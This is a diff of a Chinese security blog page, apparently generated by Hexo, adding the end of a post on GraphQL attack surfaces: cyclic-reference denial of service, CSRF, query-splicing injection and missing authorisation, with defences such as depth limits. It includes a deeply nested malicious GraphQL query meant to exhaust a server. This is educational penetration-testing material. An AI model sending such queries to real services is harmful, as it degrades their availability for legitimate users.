+  <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token class-name">Int</span><span class="token punctuation">,</span> after<span class="token operator">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token class-name">Message</span><span class="token punctuation">]</span>
+<span class="token punctuation">}</span>
+
+type <span class="token class-name">Message</span> <span class="token punctuation">{</span>
+  thread<span class="token operator">:</span> <span class="token class-name">Thread</span>
+<span class="token punctuation">}</span>
+
+type <span class="token class-name">Query</span> <span class="token punctuation">{</span>
+  <span class="token function">thread</span><span class="token punctuation">(</span>id<span class="token operator">:</span> ID<span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token class-name">Thread</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当攻击者做如下查询，嵌套多次之后容易造成DOS</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">query maliciousQuery <span class="token punctuation">{</span>
+  <span class="token function">thread</span><span class="token punctuation">(</span>id<span class="token operator">:</span> <span class="token string">"some-id"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token number">99999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      thread <span class="token punctuation">{</span>
+        <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token number">99999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          thread <span class="token punctuation">{</span>
+            <span class="token function">messages</span><span class="token punctuation">(</span>first<span class="token operator">:</span> <span class="token number">99999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+              thread <span class="token punctuation">{</span>
+                # <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>repeat times <span class="token number">10000.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+              <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+          <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>关于这种关联对象的发现，可以使用前文提到的工具<a target="_blank" rel="noopener" href="https://ivangoncharov.github.io/graphql-voyager/" title="https://ivangoncharov.github.io/graphql-voyager/">https://ivangoncharov.github.io/graphql-voyager/</a> ，就可以直观的看到对象之间的调用关系，如果两个对象存在循环调用的关系，就存在此漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_cEb2c-wO-o.png"></p>
+<p>另外可使用工具查询获取某参数的查询路径：<a target="_blank" rel="noopener" href="https://gitlab.com/dee-see/graphql-path-enum" title="https://gitlab.com/dee-see/graphql-path-enum">https://gitlab.com/dee-see/graphql-path-enum</a></p>
+<h3 id="防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100"><a href="#防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100" class="headerlink" title="防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100"></a>防御方式：增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100</h3><h2 id="6、CSRF"><a href="#6、CSRF" class="headerlink" title="6、CSRF"></a>6、CSRF</h2><p>修改原先json格式的post内容，假如GraphQL的端点支持将query语句使用传参的方式，将Content-Type修改为application/x-www-form-urlencoded，就有可能存在CSRF</p>
+<p>偷一下P牛的ppt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_gGPZFrFw73.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_7oD4wsctZg.png"></p>
+<h2 id="7、SQL注入"><a href="#7、SQL注入" class="headerlink" title="7、SQL注入"></a>7、SQL注入</h2><p>GraphQL的注入感觉有点鸡肋，可以参考内省查询的接口，在参数后拼接另外一个query或者mutation。</p>
+<p>一般要是直接能拿到GraphQL端点，直接使用可用的query或者mutation查询即可，也就不存在SQL注入这一说了。</p>
+<p>假设场景接收用户传参，GraphQL的接口不对外开放，参数在拼接成完整的GraphQL语句之后进行查询，那么如果没有做好参数恶意过滤，那么参数就可拼接一个完整的查询或者更改达成SQL注入了。</p>
+<p>继续偷一下P牛的PPT，主要注意下GraphQL的语法问题，拼接后能够友好执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/mumu0215/picForhexo@1.4/pic-20220713/image_hwaE_Aj8da.png"></p>
+<h2 id="8、接口权限问题"><a href="#8、接口权限问题" class="headerlink" title="8、接口权限问题"></a>8、接口权限问题</h2><p>使用内省查询获取的接口如果缺乏鉴权，就可被攻击者越权利用获取数据或者权限。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://graphql.cn/learn/schema/" title="https://graphql.cn/learn/schema/">https://graphql.cn/learn/schema/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.assetnote.io/2021/08/29/exploiting-graphql/" title="https://blog.assetnote.io/2021/08/29/exploiting-graphql/">https://blog.assetnote.io/2021/08/29/exploiting-graphql/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf" title="https://xzfile.aliyuncs.com/upload/zcon/2018/7_攻击GraphQL_phithon.pdf">https://xzfile.aliyuncs.com/upload/zcon/2018/7_攻击GraphQL_phithon.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7012133339037450271#heading-11" title="https://juejin.cn/post/7012133339037450271#heading-11">https://juejin.cn/post/7012133339037450271#heading-11</a></p>
 
                 
             </div>
@@ -590,7 +720,7 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://half90.top/2021/07/20/cve-2021-1675-fu-xian/">https://half90.top/2021/07/20/cve-2021-1675-fu-xian/</a>
+                    <a href="https://half90.top/2022/07/13/graphql-gong-ji-mian-zong-jie/">https://half90.top/2022/07/13/graphql-gong-ji-mian-zong-jie/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -628,16 +758,12 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91/">
-                                    <span class="chip bg-color">内网</span>
+                                <a href="/tags/Web%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">Web渗透</span>
                                 </a>
                             
-                                <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">域渗透</span>
-                                </a>
-                            
-                                <a href="/tags/PrintNightmare/">
-                                    <span class="chip bg-color">PrintNightmare</span>
+                                <a href="/tags/GraphQL/">
+                                    <span class="chip bg-color">GraphQL</span>
                                 </a>
                             
                         </div>
@@ -950,17 +1076,18 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/08/30/cve-2021-26855-proxylogon-fu-xian/">
+                <a href="/2022/07/13/graphql-gong-ji-mian-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="CVE-2021-26855 proxylogon复现">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="GraphQL攻击面总结">
                         
-                        <span class="card-title">CVE-2021-26855 proxylogon复现</span>
+                        <span class="card-title">GraphQL攻击面总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -970,38 +1097,31 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Microsoft-Exchange/" class="post-category">
-                                    Microsoft Exchange
-                                </a>
-                            
-                            <a href="/categories/CVE-2021/" class="post-category">
-                                    CVE-2021
+                            <a href="/categories/Web%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    Web渗透学习
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Exchange/">
-                        <span class="chip bg-color">Exchange</span>
+                    <a href="/tags/Web%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">Web渗透</span>
                     </a>
                     
-                    <a href="/tags/SSRF/">
-                        <span class="chip bg-color">SSRF</span>
-                    </a>
-                    
-                    <a href="/tags/Proxylogon/">
-                        <span class="chip bg-color">Proxylogon</span>
+                    <a href="/tags/GraphQL/">
+                        <span class="chip bg-color">GraphQL</span>
                     </a>
                     
                 </div>
@@ -1015,13 +1135,13 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/01/nei-wang-chu-tan-windows-hash-ti-qu/">
+                <a href="/2021/12/17/cve-2021-42287-cve-2021-42278-yu-quan-xian-ti-sheng/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="内网初探-windows hash提取">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="CVE-2021-42287/CVE-2021-42278 域权限提升">
                         
-                        <span class="card-title">内网初探-windows hash提取</span>
+                        <span class="card-title">CVE-2021-42287/CVE-2021-42278 域权限提升</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1032,7 +1152,7 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-17
                             </span>
                         <span class="publish-author">
                             
@@ -1040,6 +1160,14 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
                             
                             <a href="/categories/windows%E5%86%85%E7%BD%91/" class="post-category">
                                     windows内网
+                                </a>
+                            
+                            <a href="/categories/CVE-2021/" class="post-category">
+                                    CVE-2021
+                                </a>
+                            
+                            <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="post-category">
+                                    域渗透
                                 </a>
                             
                             
@@ -1053,12 +1181,16 @@ REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWO
                         <span class="chip bg-color">内网</span>
                     </a>
                     
-                    <a href="/tags/vssadmin/">
-                        <span class="chip bg-color">vssadmin</span>
+                    <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">域渗透</span>
                     </a>
                     
-                    <a href="/tags/mimikatz/">
-                        <span class="chip bg-color">mimikatz</span>
+                    <a href="/tags/%E6%8F%90%E6%9D%83/">
+                        <span class="chip bg-color">提权</span>
+                    </a>
+                    
+                    <a href="/tags/Kerberos%E5%8D%8F%E8%AE%AE/">
+                        <span class="chip bg-color">Kerberos协议</span>
                     </a>
                     
                 </div>
